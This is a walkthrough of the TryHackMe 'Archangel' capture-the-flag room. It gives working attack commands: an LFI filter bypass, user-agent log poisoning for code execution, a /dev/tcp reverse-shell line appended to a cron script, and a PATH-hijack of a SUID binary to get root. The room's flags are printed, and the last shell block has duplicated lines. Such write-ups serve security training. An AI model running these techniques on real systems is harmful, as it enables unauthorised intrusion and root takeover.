---
title: Walkthrough - Archangel
published: True
---

Boot2root, Web Exploitation, Privilege Escalation, LFI. A well known security solutions company seems to be doing some testing on their live machine. Best time to exploit it.

[https://tryhackme.com/room/archangel](https://tryhackme.com/room/archangel)

* * *

## Get a shell

- nmap

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- gobuster scans

```shell
/pages                (Status: 301) [Size: 314] [--> http://10.10.100.253/pages/]
/images               (Status: 301) [Size: 315] [--> http://10.10.100.253/images/]
/flags                (Status: 301) [Size: 314] [--> http://10.10.100.253/flags/] 
/layout               (Status: 301) [Size: 315] [--> http://10.10.100.253/layout/]
```

**Find a different hostname**

![0xskar](/assets/archangel01.png)

- checking the source code of ``http://10.10.100.253`` we find ``support@mafialive.thm`` we can add this domain to the hosts file  to continue enumeration. After traveling there we find our first flag.

**Find flag 1**

![0xskar](/assets/archangel02.png)

**Look for a page under development**

- ``gobuster dir -u http://mafialive.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 -x php,txt --no-error``
- we find a page but we canty view the code in test.php have to find a way around this.
- ``curl -s http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`` using ``php://filter`` allows us to bypass the protection and ``convert.base64-encode/resource=`` lets us encode test.php as base64 lets see what we are working with

**Find flag 2**

```php
<?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
```

**Get a shell and find the user flag**

- the url must not contain ``../..`` but must contain ``/var/www/html/development_testing``
- so we need to use LFI Log Poisoning...having never attempted this before going to follow [this writeup](https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d).
- we can setup php webserver with php reverse shell and get this over to the target machine by poisining the log file with thee user-agent.

- start by poising the logfile with the php payload in the user-agent string

![0xskar](/assets/archangel03.png)

- we get ``cmd=id HTTP/1.1" 200 997 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data) " ``
- now we can wget our reverse shell, then traverse to open up the reverse shell when we have our netcat listener setup.

* * * 

## What is the user flag?

![0xskar](/assets/archangel04.png)

* * * 

## What is the root flag?

- checking the ``/etc/crontab`` can see that we can move to archangel - ``echo "sh -i >& /dev/tcp/10.2.127.225/6670 0>&1" >> /opt/helloworld.sh``
- setup listener ``rlwrap nc -lvnp 6670``

![0xskar](/assets/archangel05.png)

- Now that we found user 2 flag we can continue escaliation to root.

- ``find / -perm -u=s -type f 2>/dev/null`` we can see that ``/home/archangel/secret/backup`` has a suid set
- checking out the backup file with ``strings`` we can see it runs ``cp`` but doesnt use a path so we can take advantage of this and leave a cp program in the directory for it to run.

```shell
cat > cp << EOF
cat > cp << EOF
#!/bin/bash
#!/bin/bash
/bin/bash -i
/bin/bash -i
EOF
EOF
chmod +x cp
chmod +x cp
export PATH=/home/archangel/secret:$PATH
export PATH=/home/archangel/secret:$PATH
./backup
./backup
id
id
uid=0(root) gid=0(root) groups=0(root),1001(archangel)
root@ubuntu:~/secret# 
```

- ``cat /root/root.txt``

* * * 

